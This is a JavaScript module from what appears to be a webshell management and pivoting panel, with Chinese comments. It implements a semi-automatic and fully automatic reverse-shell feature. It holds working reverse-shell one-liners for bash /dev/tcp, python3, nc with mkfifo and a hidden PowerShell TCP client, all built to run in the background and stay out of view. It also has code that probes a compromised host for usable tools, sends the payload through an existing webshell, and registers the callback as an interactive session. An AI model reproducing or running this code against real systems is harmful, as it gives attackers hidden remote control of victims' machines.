/* ============================================================
   反弹 Shell 模块 — 半自动 / 全自动
   WebShell 伪终端 → 攻击机（面板本机）监听 → 靶机回连 → 登记为交互会话
   载荷库（多语法 × 多编码 × 多平台）由后端 /api/shells/reverse/payload(s) 提供：
   前端只负责选择与展示，命令本体、编码变形、后台包装全在后端（可单测）。
   ============================================================ */
(function (global) {
  'use strict';
  const { ref, reactive, computed, watch } = Vue;
  const S = PivotStore;

  /* 后端不可用时的兜底载荷（离线演示不至于空白；线上以载荷库为准） */
  const FALLBACK_PAYLOADS = {
    'bash-tcp': {
      label: 'Linux · bash /dev/tcp（内置兜底）',
      platform: 'linux', ctx: 'bash', needs: [],
      cmd: (c) => "nohup bash -c 'bash -i >& /dev/tcp/" + c.ip + '/' + c.port + " 0>&1' >/dev/null 2>&1 &",
    },
    python3: {
      label: 'Linux · python3（内置兜底）',
      platform: 'linux', ctx: 'sh', needs: ['python3'],
      cmd: (c) => "nohup python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"" + c.ip + '",' + c.port + '));' +
        '[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])\' >/dev/null 2>&1 &',
    },
    'nc-fifo': {
      label: 'Linux · nc + mkfifo（内置兜底）',
      platform: 'linux', ctx: 'sh', needs: ['nc'],
      cmd: (c) => "nohup sh -c 'rm -f /tmp/.pf;mkfifo /tmp/.pf;cat /tmp/.pf|/bin/sh -i 2>&1|nc " + c.ip + ' ' + c.port +
        " >/tmp/.pf' >/dev/null 2>&1 &",
    },
    'ps-tcp': {
      label: 'Windows · PowerShell（内置兜底）',
      platform: 'windows', ctx: 'ps', needs: ['powershell'],
      cmd: (c) => 'start /b powershell -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object Net.Sockets.TCPClient(\'' +
        c.ip + '\',' + c.port + ');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};' +
        'while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);' +
        '$o=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($o);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"',
    },
  };
  /* 探测命令兜底（与后端 PROBE_CMD_LINUX 一致；后端会在目录响应里回真值） */
  const FALLBACK_PROBE = 'for c in bash sh nc ncat socat perl python3 python php ruby node ' +
    'gawk busybox telnet base64 xxd openssl curl wget timeout script mkfifo mknod; do ' +
    'command -v $c >/dev/null 2>&1 && echo PIVOTHUB_HAVE:$c; done';

  global.Components['reverse-view'] = {
    name: 'ReverseView',
    template: '#tpl-reverse',
    setup() {
      const ui = S.state.ui;
      const mode = ref('semi');            /* semi | auto */
      const shellId = ref('');
      const bind = ref('');
      const port = ref(4444);
      const payloadId = ref('bash-tcp');
      const encode = ref('raw');
      const running = ref(false);
      const listener = ref(null);
      const listeners = ref([]);
      const log = reactive([]);
      const detected = ref([]);
      /* 载荷库（后端）：groups/items/encoders/probeCmd */
      const catalog = ref(null);
      const rendered = ref('');
      const renderInfo = ref(null);
      const renderError = ref('');
      const tools = ref(null);       /* 目标真实探测到的工具集（null = 未探测） */
      const execCtx = ref('');       /* 执行语境：shell（经 /bin/sh 解析）| argv（按空白切词）*/
      const probing = ref(false);
      let timer = null;
      let registering = false;
      let renderSeq = 0;

      const wsShells = computed(() => S.state.shells.filter((s) => s.kind !== 'reverse'));
      const reverseShells = computed(() => S.state.shells.filter((s) => s.kind === 'reverse'));
      const failedListeners = computed(() => listeners.value.filter((l) => l.error));
      const activeShell = computed(() => S.state.shells.find((x) => x.id === shellId.value) || null);
      const platform = computed(() => (activeShell.value ? S.shellPlatform(activeShell.value) : 'linux'));

      /* 下拉数据：有目录用目录（按目标平台过滤），否则内置兜底 */
      const kindGroups = computed(() => {
        if (catalog.value && catalog.value.groups && catalog.value.groups.length) {
          const plat = platform.value;
          return catalog.value.groups
            .map((g) => ({ label: g.label, items: g.items.filter((i) => !plat || i.platform === plat) }))
            .filter((g) => g.items.length);
        }
        const items = Object.keys(FALLBACK_PAYLOADS)
          .map((k) => Object.assign({ id: k }, FALLBACK_PAYLOADS[k]))
          .filter((i) => i.platform === platform.value);
        return items.length ? [{ label: '内置载荷（后端载荷库不可用）', items: items }] : [];
      });
      const kinds = computed(() => {
        const out = [];
        kindGroups.value.forEach((g) => g.items.forEach((i) => out.push(i)));
        return out;
      });
      const selected = computed(() => kinds.value.find((i) => i.id === payloadId.value) || kinds.value[0] || null);
      /* 编码方式随语境内置过滤：ps/cmd 语境只有「原样」，argv 只保留无空格类 */
      const encoders = computed(() => {
        const all = (catalog.value && catalog.value.encoders) || [{ key: 'raw', label: '原样（不编码）', ctx: ['sh', 'bash', 'argv', 'ps', 'cmd'] }];
        const ctx = selected.value ? selected.value.ctx : '';
        return all.filter((e) => !ctx || (e.ctx || []).indexOf(ctx) >= 0);
      });
      const missingOf = computed(() => {
        const info = renderInfo.value || {};
        return (info.missing || []).concat(info.encodeMissing || []);
      });

      /* 渲染当前组合（ip/port/语法/编码/工具集任一变化都重渲染） */
      function refreshRender() {
        const ip = (bind.value || '').trim();
        const p = Number(port.value) || 0;
        renderError.value = '';
        if (!catalog.value) { rendered.value = ''; return; }   /* 回退：payload() 用内置表 */
        if (!ip || !p) { rendered.value = ''; renderError.value = '填入监听地址与端口后生成命令'; return; }
        const seq = ++renderSeq;
        S.reversePayload({ id: payloadId.value, encode: encode.value, ip: ip, port: p, tools: tools.value })
          .then((out) => {
            if (seq !== renderSeq) return;             /* 只认最后一次请求（端口输入会连发） */
            if (out && out.ok) {
              rendered.value = out.cmd;
              renderInfo.value = out;
            } else {
              rendered.value = '';
              renderInfo.value = null;
              renderError.value = (out && out.error) || '载荷渲染失败';
            }
          });
      }

      function loadCatalog() {
        return S.reversePayloads({ ip: bind.value, port: Number(port.value) || 0, platform: platform.value, tools: tools.value })
          .then((out) => {
            if (!out || !out.ok) {
              if (out && out.error) push('warn', '载荷库不可用（' + out.error + '）：暂用内置载荷');
              catalog.value = null;
              refreshRender();
              return;
            }
            catalog.value = out;
            const has = (out.items || []).some((i) => i.id === payloadId.value && i.platform === platform.value);
            if (!has) {
              const first = (out.items || []).find((i) => i.platform === platform.value);
              payloadId.value = first ? first.id : payloadId.value;
            }
            refreshRender();
          });
      }

      function payload() {
        if (rendered.value) return rendered.value;
        if (catalog.value) return '';
        const t = FALLBACK_PAYLOADS[payloadId.value] || FALLBACK_PAYLOADS['bash-tcp'];
        return t.cmd({ ip: bind.value, port: Number(port.value) || 0 });
      }
      function payloadLabel() {
        return (renderInfo.value && renderInfo.value.label) || (selected.value && selected.value.label) || payloadId.value;
      }
      function push(k, text) { log.push({ k, text }); }
      function stopPolling() { if (timer) { clearInterval(timer); timer = null; } }

      /* 执行语境探测：`echo $((1+1))` 经 shell 得 2，按空白切词的执行器（Java
         Runtime.exec(String)）原样回 `$((1+1))`。两者可用的载荷形态完全不同。 */
      function probeExecCtx() {
        return S.execOn(shellId.value, 'echo PIVOTHUB_CTX_$((1+1))').then((out) => {
          const text = String((out && (out.output || out.error)) || '');
          if (/PIVOTHUB_CTX_2\b/.test(text)) {
            execCtx.value = 'shell';
            push('ok', '执行语境：经 /bin/sh 解析（引号、$()、重定向等特殊字符可用）');
          } else if (text.indexOf('PIVOTHUB_CTX_$((1+1))') >= 0) {
            execCtx.value = 'argv';
            push('warn', '⚠ 执行语境：按空白切词、不做 shell 解析（Java Runtime.exec(String) 类）'
              + '——引号与特殊字符会被撕碎，请在「无空格形态」里选载荷');
          } else {
            execCtx.value = '';
            push('dim', '执行语境未能判定（回显：' + text.trim().slice(0, 80) + '）');
          }
        });
      }

      /* 目标工具探测：command -v 真实回显 → 标注哪些载荷本目标不可用 */
      function probeTools() {
        if (!shellId.value) { push('err', '请先选择在哪个 WebShell 会话里执行'); return; }
        probing.value = true;
        push('dim', '探测执行语境与可用工具…');
        probeExecCtx().then(() => {
          if (execCtx.value === 'argv') {
            probing.value = false;
            /* 按空白切词的执行器连 `command -v x` 都跑不了（会被拆成 argv）→ 如实说明，
               不做假探测；无空格形态自带 bash+base64 依赖，先按未知处理。 */
            push('dim', '该执行器无法运行常规工具探测命令（会被逐词拆分）：'
              + '无空格载荷依赖目标自带 bash 与 base64，下发后若报 command not found 再换形态');
            loadCatalog();
            return;
          }
          const cmd = (catalog.value && catalog.value.probeCmd) || FALLBACK_PROBE;
          return S.execOn(shellId.value, cmd).then((out) => {
            probing.value = false;
            const found = String((out && out.output) || '').split(/\r?\n/)
              .map((l) => (l.match(/PIVOTHUB_HAVE:([A-Za-z0-9._-]+)/) || [])[1])
              .filter(Boolean);
            if (!found.length) {
              push('warn', '未探测到任何工具（回显异常或命令被拦截）：'
                + String((out && (out.error || out.output)) || '').trim().slice(0, 120));
              return;
            }
            tools.value = found;
            push('ok', '目标可用工具：' + found.join(' / '));
            if (found.indexOf('bash') < 0) push('warn', '⚠ 目标没有 bash：/dev/tcp 类载荷不可用，改用 nc / 编码类形态');
            if (found.indexOf('base64') < 0) push('warn', '⚠ 目标没有 base64：编码类载荷请选 perl / openssl / 八进制形态');
            loadCatalog();
          });
        });
      }

      /* 载荷形态与执行语境是否冲突（只做提示，不隐藏——由操作者决定） */
      function ctxMismatch(item) {
        if (!execCtx.value || !item) return false;
        if (execCtx.value === 'argv') return item.ctx === 'sh' || item.ctx === 'bash';
        return item.ctx === 'argv';
      }

      function initFromUi() {
        bind.value = (S.state.attack && S.state.attack.ip) || '127.0.0.1';
        const want = ui.revShellId;
        const ids = wsShells.value.map((s) => s.id);
        if (want && ids.indexOf(want) >= 0) shellId.value = want;
        else if (ids.indexOf(shellId.value) < 0) {
          const alive = wsShells.value.find((s) => s.alive);
          shellId.value = (alive || wsShells.value[0] || {}).id || '';
        }
        checkBind();
        loadCatalog();
      }

      /* 监听地址是否仍是本机地址（休眠 / 换网后旧 IP 会失效 → WinError 10049） */
      function checkBind() {
        S.netinfo().then((out) => {
          detected.value = (out && out.ips) || [];
          if (bind.value && bind.value !== '127.0.0.1' &&
              detected.value.length && detected.value.indexOf(bind.value) < 0) {
            push('warn', '⚠ 监听地址 ' + bind.value + ' 已不在本机地址列表中（休眠/换网后可能变了）');
            push('dim', '本机当前地址：' + detected.value.join(' / ') + ' · 可点「使用检测到的地址」');
          }
        });
      }
      function useDetected() {
        if (!detected.value.length) { push('warn', '未检测到非回环地址'); return; }
        bind.value = detected.value[0];
        push('dim', '监听地址改为 ' + bind.value);
      }

      function refreshListeners() {
        return S.reverseListeners().then((out) => {
          listeners.value = (out && out.listeners) || [];
          if (listener.value) {
            const me = listeners.value.find((x) => x.id === listener.value.id);
            if (!me) { listener.value = null; running.value = false; stopPolling(); }
            else listener.value = me;
          }
        });
      }

      function startPolling() {
        if (timer) return;
        timer = setInterval(() => {
          if (!listener.value) return;
          S.reverseListeners().then((out) => {
            listeners.value = (out && out.listeners) || [];
            const me = listeners.value.find((x) => x.id === (listener.value || {}).id);
            if (!me) { push('err', '监听已消失（服务端可能已重启）'); running.value = false; stopPolling(); return; }
            listener.value = me;
            if (me.connected && !registering) register(me);
          });
        }, 1500);
      }

      /* 【A5】手动登记：自动登记失败时的兜底（原实现只有自动一条路，失败就没辙） */
      const manualHostId = ref('');
      const hosts = computed(() => S.state.hosts || []);
      let autoTries = 0;

      function listenerState(l) {
        if (l.error) return '监听失败';
        if (l.connected) return '已回连·未登记';
        /* 通道已被登记取走：监听 socket 已关，不能再显示「等待回连」（绿点/状态不许骗人） */
        if (l.consumed) return '已转为会话';
        return '等待回连';
      }
      function listenerPeer(l) {
        return (l.peer && l.peer[0]) ? (l.peer[0] + ':' + (l.peer[1] || '')) : '—';
      }

      function register(me, manual) {
        if (registering) return;
        const meId = (me && me.id) || (listener.value && listener.value.id);
        if (!meId) { push('err', '登记失败：监听不存在'); return; }
        const live = listeners.value.find((x) => x.id === meId) || me || {};
        if (!live.connected) { push('warn', '该监听尚无回连，无法登记（先把靶机反弹起来）'); return; }
        registering = true;
        const target = S.state.shells.find((x) => x.id === shellId.value) || {};
        const peerIp = (live.peer || [])[0] || '';
        const hostId = manual ? (manualHostId.value || '') : (target.hostId || manualHostId.value || '');
        push('ok', '收到回连 ' + (peerIp || '?') + ' → 登记为面板会话…'
          + (manual ? '（手动登记）' : ''));
        S.reverseRegister({
          listenerId: meId,
          hostId: hostId,
          hostIp: peerIp,          /* 后端按 hostId → 同 IP 主机 → hostIp 自动建主机 */
          type: '反弹 Shell（' + payloadLabel() + (encode.value !== 'raw' ? ' / ' + encode.value : '') + '）',
        }).then((out) => {
          registering = false;
          if (!out || !out.ok) {
            autoTries += 1;
            const why = (out && out.error) || '未知原因';
            push('err', '登记失败：' + why);
            if (!manual && autoTries >= 2) {
              push('warn', '自动登记已连续失败 ' + autoTries + ' 次：请在上方「登记主机」下拉里手动指定主机后点「登记为会话」');
            }
            return;
          }
          autoTries = 0;
          push('ok', '✓ 已登记会话 ' + out.shell.id + ' · ' + out.shell.url + ' · ' + out.shell.latency + 'ms');
          S.toast('反弹 Shell 回连成功，已登记为面板会话', 'ok');
          running.value = false;
          stopPolling();
          /* 通道已转为会话，监听记录没有用了（socket 已关）：顺手清理，避免看着像还在监听 */
          S.reverseCloseListener(meId).then(() => {
            if (listener.value && listener.value.id === meId) listener.value = null;
            refreshListeners();
          });
        });
      }

      function start() {
        log.length = 0;
        push('dim', (mode.value === 'auto' ? '全自动档' : '半自动档') + ' · 在 ' + bind.value + ':' + port.value + ' 开监听…');
        S.reverseListen({ bind: bind.value, port: port.value, label: shellId.value }).then((out) => {
          if (!out || !out.ok) {
            push('err', '监听失败：' + ((out && out.error) || '未知原因'));
            if (out && out.localIps && out.localIps.length) {
              detected.value = out.localIps;
              push('dim', '本机当前地址：' + out.localIps.join(' / '));
            }
            return;
          }
          listener.value = out.listener;
          running.value = true;
          push('ok', '监听已启动：' + out.listener.bind + ':' + out.listener.port +
            (out.replaced ? '（已替换同端口的残留监听）' : ''));
          refreshListeners();
          startPolling();
          if (mode.value === 'auto') send();
        });
      }

      function send() {
        if (!shellId.value) { push('err', '请先选择在哪个 WebShell 会话里执行'); return; }
        const cmd = payload();
        if (!cmd) { push('err', renderError.value || '命令尚未生成：先填监听地址与端口'); return; }
        if (missingOf.value.length) {
          push('warn', '⚠ 该组合依赖目标上的 ' + missingOf.value.join(' / ')
            + '：本次探测未发现，下发后大概率 command not found（先点「探测执行语境 / 可用工具」或换形态）');
        }
        push('dim', '→ 下发到会话 ' + shellId.value + '：' + cmd);
        S.execOn(shellId.value, cmd).then((out) => {
          const why = out && (out.error || out.reason);
          if (!out || (out.ok === false && why)) {
            push('err', '执行失败：' + (why || '未知原因'));
          } else if (out.ok === false) {
            /* 后台命令（nohup … &）没有回显，HTTP 马驱动会因「无 EOF 标记」判失败——实际已下发 */
            push('warn', '命令已下发（后台执行、无回显属正常）；等待靶机回连…');
          } else {
            push('ok', '命令已下发，等待靶机回连…' +
              (out.output ? ' 回显：' + String(out.output).trim().slice(0, 100) : ''));
          }
        });
      }

      function closeOne(id) {
        S.reverseCloseListener(id).then(() => {
          if (listener.value && listener.value.id === id) {
            listener.value = null; running.value = false; stopPolling();
          }
          refreshListeners();
          push('dim', '已关闭监听 ' + id);
        });
      }
      function closeAll() {
        S.reverseCloseAll().then((out) => {
          listener.value = null; running.value = false; stopPolling();
          refreshListeners();
          push('dim', '已清理 ' + ((out && out.closed) || 0) + ' 个监听');
        });
      }
      function openSession(id) { S.openTerminalById(id); }
      function copyPayload() { S.copy(payload()); }

      /* 重试恢复面板重启时未能自动拉起的监听（换网后地址又回来了等场景） */
      function retryRestore() {
        S.reverseRestoreListeners().then((out) => {
          const n = (out && out.restored) || 0;
          const bad = (out && out.failed) || [];
          push(n ? 'ok' : 'warn', '重试恢复：成功 ' + n + ' 个' +
            (bad.length ? '，仍失败 ' + bad.length + ' 个' : ''));
          bad.forEach((f) => push('err', f.bind + ':' + f.port + ' — ' + f.error));
          refreshListeners();
        });
      }

      /* 换会话 / 换平台 / 换语法 / 换编码 → 重渲染；地址端口输入抖动做 300ms 去抖 */
      let debounce = null;
      function scheduleReload() {
        if (debounce) clearTimeout(debounce);
        debounce = setTimeout(() => { debounce = null; if (catalog.value) loadCatalog(); }, 300);
      }
      watch([bind, port], scheduleReload);
      watch([payloadId], () => {
        const okEnc = encoders.value.some((e) => e.key === encode.value);
        if (!okEnc) encode.value = 'raw';
        refreshRender();
      });
      watch(encode, refreshRender);
      watch(shellId, (id) => {
        const s = S.state.shells.find((x) => x.id === id);
        if (!s) return;
        tools.value = null;                    /* 换目标 → 之前的工具探测结论作废 */
        loadCatalog();
      });

      initFromUi();
      refreshListeners().then(() => {
        failedListeners.value.forEach((l) =>
          push('warn', '监听 ' + l.bind + ':' + l.port + ' 未自动恢复：' + (l.error || '未知原因')));
      });

      return {
        ui, mode, shellId, bind, port, payloadId, encode, running, listener, listeners, log, detected,
        wsShells, reverseShells, kindGroups, kinds, selected, encoders, payload, payloadLabel,
        failedListeners, catalog, rendered, renderInfo, renderError, tools, probing, missingOf, platform,
        execCtx, ctxMismatch,
        start, send, closeOne, closeAll, refreshListeners, retryRestore, useDetected, probeTools,
        openSession, copyPayload,
        register, manualHostId, hosts, listenerState, listenerPeer,
        ipOf: S.ipOf, icon: global.icon,
      };
    },
  };
})(window);
